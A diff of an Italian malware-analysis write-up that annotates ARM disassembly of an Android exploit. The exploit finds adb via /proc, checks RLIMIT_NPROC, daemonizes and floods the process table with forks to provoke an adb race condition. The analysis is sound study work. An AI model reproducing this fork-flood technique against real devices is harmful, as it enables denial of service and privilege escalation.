@@ -87,11 +87,11 @@ FORK FLOOD ~ HCF
 
 ;l'analisi di questo campione malware è stata condotta attraverso un processo di reverse engineering sul codice assembly, con l'obiettivo di ricostruire il comportamento reale del binario senza alcun accesso al codice sorgente originale. Il lavoro non si è basato su ipotesi astratte, ma sull'osservazione diretta delle istruzioni macchina, delle chiamate di sistema e delle interazioni con il sistema operativo.
 
-;il comportamento emerge dalla lettura del flusso assembly: gestione dei processi, accesso al filesystem virtuale di Linux tramite /proc, utilizzo delle syscall e manipolazione delle risorse del sistema.
+;il comportamento emerge dalla lettura del flusso assembly: gestione dei processi, accesso al filesystem virtuale di Android tramite /proc, utilizzo delle syscall e manipolazione delle risorse del sistema.
 
 ;il risultato è la ricostruzione di un malware che non si limita a sfruttare una singola vulnerabilità classica, ma agisce controllando e alterando progressivamente le condizioni operative del sistema fino a renderlo instabile e vulnerabile a una race condition durante la gestione di adb.
 
-;il comportamento del malware emerge in modo progressivo e coerente lungo tutta la sua esecuzione. La prima fase è caratterizzata da una ricognizione attiva del sistema. Il codice esplora l'elenco dei processi leggendo iterativamente le directory sotto /proc, cercando di individuare un processo specifico, in particolare quello associato ad adb. Il malware costruisce una mappa dello stato corrente del sistema prima di intervenire.
+;il comportamento del malware emerge in modo progressivo e coerente lungo tutta la sua esecuzione. La prima fase è caratterizzata da una ricognizione attiva del sistema. Il codice esplora l'elenco dei processi leggendo iterativamente le directory sotto /proc, cercando di individuare un processo specifico, in particolare quello associato ad adb. 
 
 ;in particolare analizza dinamicamente i cmdline dei processi attivi:
 
@@ -102,9 +102,9 @@ FORK FLOOD ~ HCF
 0x000086a4  bl sym.imp.sprintf
 @@@
 
-;char *s
-;format: "/proc/%d/cmdline"
-;PID corrente (var_10h contatore)
+;r0, char *s
+;r1, format: "/proc/%d/cmdline"
+;r2, PID corrente (var_10h contatore)
 
 ;sono i tre parametri passati alla sprintf
 ;int sprintf(char *s, const char *format, var_10h)
@@ -119,8 +119,8 @@ FORK FLOOD ~ HCF
 0x000086b4  bl sym.imp.open
 @@@
 
-;path  "/proc/%d/cmdline"
-;O_RDONLY
+;r0, path  "/proc/%d/cmdline"
+;r1, O_RDONLY
 
 ;apertura file, open(path, O_RDONLY)
 
@@ -133,9 +133,10 @@ FORK FLOOD ~ HCF
 0x000086f8  bl sym.imp.close
 @@@
 
-;buf
-;nbyte = 0xff, 255
-;lettura byte e chiusura file
+;r0, fildes
+;r1, buf
+;r2, nbyte = 0xff, 255
+;read(int fildes, void *buf, size_t nbyte)
 
 @@@
 0x00008708  add r3, pc, r3   
@@ -145,19 +146,24 @@ FORK FLOOD ~ HCF
 0x0000871c  beq 0x8730      
 @@@
 
-;"/sbin/adb"
-;const char *s1
+;r1, "/sbin/adb"
+;r0, const char *s1
 ;strstr(s1,"/sbin/adb")
 ;non trovato, incrementa e continua
 
-;una volta individuata la presenza del processo adb, il comportamento si sposta verso la manipolazione delle risorse. Il codice verifica i limiti imposti dal sistema operativo, in particolare il numero massimo di processi consentiti per utente. Questo controllo è fondamentale perché l'intero attacco si basa sulla capacità di saturare tali limiti. Se il sistema non impone vincoli, il malware si interrompe, segno che la sua strategia dipende fortemente da condizioni ambientali precise.
-
-;una volta completata la fase di ricognizione, il comportamento si sposta verso il controllo delle risorse del sistema. Prima di eseguire l'attacco vero e proprio, il malware verifica i limiti imposti dal kernel:
+;una volta individuata la presenza del processo adb, il comportamento si sposta verso la manipolazione delle risorse. Il codice verifica i limiti imposti dal sistema operativo, in particolare il numero massimo di processi consentiti per utente. Questo controllo è fondamentale perché l'intero attacco si basa sulla capacità di saturare tali limiti. Se il sistema non impone vincoli, il malware si interrompe, segno che la sua strategia dipende fortemente da condizioni ambientali precise.Prima di eseguire l'attacco vero e proprio, il malware verifica i limiti imposti dal kernel:
 
 @@@
 0x0000884c      mov r0, 6
 0x00008850      mov r1, r3
 0x00008854      bl sym.imp.getrlimit
+@@@
+
+;r0, 6, RLIMIT_NPROC        
+;confronta con RLIM_INFINITY
+;getrlimit(int resource, struct rlimit *rlim);
+
+@@@
 0x00008858      mov r3, r0
 0x0000885c      cmp r3, 0
 0x00008860      bge 0x8874
@@ -166,8 +172,16 @@ FORK FLOOD ~ HCF
 0x0000886c      mov r0, r3
 0x00008870      bl fcn.00008630
 0x00008874      ldr r3, [fp, -0x28]         
-0x00008878      cmn r3, 1                   
-0x0000887c      bne 0x8898
+0x00008878      cmn r3, 1 
+0x0000887c      bne 0x8898  
+@@@
+
+;RLIM_INFINITY = 0xFFFFFFFF
+;Compare Negative = esegue r3 + 1 e aggiorna i flag.
+;se r3 = 0xFFFFFFFF (cioè -1, tutti bit a 1), allora:
+;0xFFFFFFFF + 1 = 0 e si attiva lo zero flag
+
+@@@
 0x00008880      ldr r3, [0x00008a7c]        
 0x00008884      add r3, pc, r3
 0x00008888      mov r0, r3
@@ -176,8 +190,7 @@ FORK FLOOD ~ HCF
 0x00008894      bl sym.imp.exit     
 @@@
 
-;RLIMIT_NPROC        
-;confronta con RLIM_INFINITY
+;se cmn r3, 1 è uguale a 0 avremo RLIM_INFINITY
 ;se il limite è finito prosegue, altrimenti esce
 
 ;questo controllo è essenziale: se non esistono limiti di processo (caso RLIM_INFINITY), l'attacco viene interrotto. Questo dimostra che il malware non agisce in maniera stupida, ma dipende fortemente dalle condizioni ambientali.
@@ -195,6 +208,7 @@ FORK FLOOD ~ HCF
 0x00008948  bl  exit          
 @@@
 
+;se fork()<=0 ci troviamo nel processo figlio quindi qui salta a LAB_0000894c
 ;fork()>0 padre esce e termina
 
 @@@
@@ -203,100 +217,153 @@ LAB_0000894c:
 0x00008958  bl  pipe          
 @@@
 
-;figlio si stacca dal terminale
-;crea pipe(pepe) per sincronizzazione
+;setsid crea una nuova sessione e rende il processo leader della sessione.
+;non ha controlling terminal, vive indipendentemente dalla shell diventa simile a un daemon, continua anche se adb si resetta.
+;figlio si stacca dal terminale.
+;crea pipe(pepe) per sincronizzazione.
+
+;pipe crea due file descriptor:
+
+;pepe[0] = read end
+;pepe[1] = write end
+
+;serve per far parlare:
+
+;processo bomber (figlio che satura il sistema con le fork).
+;processo controller (padre che aspetta).
 
 ;il codice si trasforma in un demone: non dipende più dal terminale e può operare in background. Questa è una fase tipica dei malware che vogliono diventare indipendenti dal terminale e operare in modo persistente.
 
-;il cuore dell'attacco consiste nella generazione massiva di processi. Il sistema viene progressivamente saturato attraverso continue chiamate di fork, fino a raggiungere il limite imposto dal kernel. In questo stato, il sistema operativo si trova in una condizione di estrema pressione sulle risorse disponibili. Non si tratta di un attacco diretto a adb, ma di una strategia indiretta: si modifica il contesto globale fino a rendere instabile il comportamento dei servizi critici.
+;il cuore dell'attacco consiste nella generazione massiva di processi. Il sistema viene progressivamente saturato attraverso continue chiamate fork, fino a raggiungere il limite imposto dal kernel. In questo stato, il sistema operativo si trova in una condizione di estrema pressione sulle risorse disponibili. Non si tratta di un attacco diretto a adb, ma di una strategia indiretta: si modifica il contesto globale fino a rendere instabile il comportamento dei servizi critici.
 
 ;la fase successiva è quella realmente distruttiva: la saturazione del sistema attraverso fork ripetuti. Il cuore dell'attacco è la generazione massiva di processi tramite fork ripetuti, fino al raggiungimento del limite di sistema.
 
 ;secondo fork: processo fork-bomber
-;il main genera un secondo figlio che diventa il processo responsabile della saturazione. il padre resta in attesa sulla pipe.
+;il main genera un secondo figlio che diventa il processo responsabile della saturazione.
+;il padre originale si sgancia e resta in attesa sulla pipe come processo di controllo.
 
 @@@
 0x0000895c  bl  fork          
+0x00008960  mov r3, r0
+0x00008964  cmp r3, 0
 0x00008968  bne LAB_00008a0c 
 @@@
 
-;fork()==0 :siamo nel figlio bomber
-;fork()>0  :siamo nel padre, salta a read/restart
+;fork()==0, siamo nel figlio fork-bomber (entra nel ramo di saturazione).
+;fork()>0, siamo nel padre, che non partecipa alla fork bomb e va nella logica di monitoraggio/restart.
 
 @@@
 0x00008974  bl  close 
+0x00008978  b   0x8980
 @@@
 
-;chiude il lato lettura della pipe, non serve al bomber
+;chiude il lato della pipe non necessario a questo processo.
+;da qui inizia la fase di saturazione vera e propria.
 
-;loop infinito di fork (il cuore della fork-bomb)
-;ogni iterazione genera un figlio che esce subito
-;il figlio morto diventa zombie e occupa un slot nella process table
-;il kernel non lo rimuove finché il padre (il processo bomber) non chiama wait()
-;il processo bomber non chiama mai wait(), quindi i zombie si accumulano
+;loop infinito di fork (core della fork bomb).
+;ogni iterazione genera un processo figlio.
+;il figlio termina immediatamente, non esegue cleanup, diventa zombie temporaneo.
+;la process table viene progressivamente saturata.
+;il sistema entra in stress su RLIMIT_NPROC.
 
 @@@
 LAB_00008980:
 0x00008980  bl  fork                  
-0x00008988  str r3,[local_14]         
+0x00008984  mov r3, r0
+0x00008988  str r3, [fp, -0x10]
 @@@
 
-;p = fork(), salva il pid restituito
-;caso p==0: siamo nel figlio appena creato
+;p=fork(), viene salvato il return value della fork nello stack.
+
+;tre casi possibili:
+
+;p==0 figlio appena creato
+;p>0 padre del bomber loop
+;p<0 fork fallita (risorse esaurite)
 
 @@@
+0x00008990  cmp r3, 0
 0x00008994  bne LAB_000089a0
-0x00008998  mov r0, #0x0
-0x0000899c  bl  exit
+0x00008998  mov r0, 0
+0x0000899c  bl  sym.imp.exit
 @@@
 
-;il figlio termina immediatamente, diventa zombie
+;caso p==0 (figlio):
+;il processo non continua l'esecuzione.
+;termina immediatamente, non sincronizza, non libera risorse.
+;contribuisce indirettamente alla pressione sul sistema (zombie/slot transienti).
 
 @@@
 LAB_000089a0:
 @@@
 
-;caso p<0: fork() ha fallito, process table piena
+;ramo non-figlio (p!=0)
+;qui si separano i due casi reali:
+;p>0 processo fork-bomber (continua a forkare).
+;p<0 fork fallita (process table piena/limite raggiunto).
 
 @@@
-0x000089a4  bge LAB_000089fc          
+0x000089a4  cmp r3, 0
+0x000089a8  bge 0x89fc
 @@@
 
-;se p>=0 la fork è riuscita, vai a incrementare il contatore
+;se p>=0 (padre fork-bomber), continua la generazione di processi.
+;se p<0, entra nella gestione di saturazione.
 
 @@@
-0x000089b4  beq LAB_0000897c          
+0x000089ac  ldr r3, [fp, -8]
+0x000089b0  cmp r3, 0
+0x000089b4  beq 0x897c
 @@@
 
-;se avevamo già segnalato il padre (new_pids==0), NOP e riprova
-;prima volta che fork fallisce: segnala al padre che i slot sono esauriti
+;controllo stato interno (new_pids).
+;evita di ripetere più volte la segnalazione al processo padre.
+;funzione di throttling del signalling su pipe.
 
 @@@
-0x000089c8  bl  printf                
-0x000089d0  str r3,[local_c]          
-0x000089e8  bl  write                 
-0x000089f4  bl  close                 
-0x000089f8  b   LAB_00008980 
+0x000089b8  ldr r3, [0x00008a9c]
+0x000089bc  add r3, pc, r3
+0x000089c0  mov r0, r3
+0x000089c4  ldr r1, [fp, -0xc]
+0x000089c8  bl sym.imp.printf
+0x000089cc  mov r3, 0
+0x000089d0  str r3, [fp, -8]
+0x000089d4  ldr r2, [fp, -0x18]
+0x000089d8  sub r3, fp, 0x1d
+0x000089dc  mov r0, r2
+0x000089e0  mov r1, r3
+0x000089e4  mov r2, 1
+0x000089e8  bl sym.imp.write
+0x000089ec  ldr r3, [fp, -0x18]
+0x000089f0  mov r0, r3
+0x000089f4  bl sym.imp.close
+0x000089f8  b   0x8980
 @@@
 
-;stampa "[+] Forked %d childs."
-;new_pids=0, non segnalare più
-;write(pepe[1], &c, 1): sblocca il padre in attesa sulla pipe
-;chiude il lato scrittura della pipe
-;continua comunque a tentare fork per mantenere la pressione
+;prima occorrenza di fork failure:
+
+;logging diagnostico.
+;write su pipe per sbloccare il processo padre (segnale di saturazione).
+;chiusura lato write della pipe per evitare duplicazioni del trigger.
+;ritorno al loop di saturazione (pressione continua sul sistema).
 
 @@@
 LAB_000089fc:
 @@@
 
-;caso p>0: fork riuscita, siamo nel padre bomber
+;caso p>0 (padre del bomber loop).
+;continua la generazione dei processi.
 
 @@@
-0x00008a00  add r3, r3, #0x1          
-0x00008a08  b   LAB_00008980
+0x00008a00  ldr r3, [fp, -0xc]
+0x00008a04  add r3, r3, #1
+0x00008a08  str r3, [fp, -0xc]
+0x00008a0c  b   0x8980
 @@@
 
-;incrementa contatore figli, torna al fork
+;incremento contatore processi generati.
+;loop infinito di fork, pressione continua sulla process table.
+;obiettivo: saturazione progressiva fino a raggiungere RLIMIT_NPROC e innescare la fase successiva dell'exploit.
 
 ;qui il comportamento è chiaro: crescita lineare dei processi fino al limite imposto dal kernel. Non è un attacco diretto a un servizio, ma una pressione sistemica sulle risorse.
 
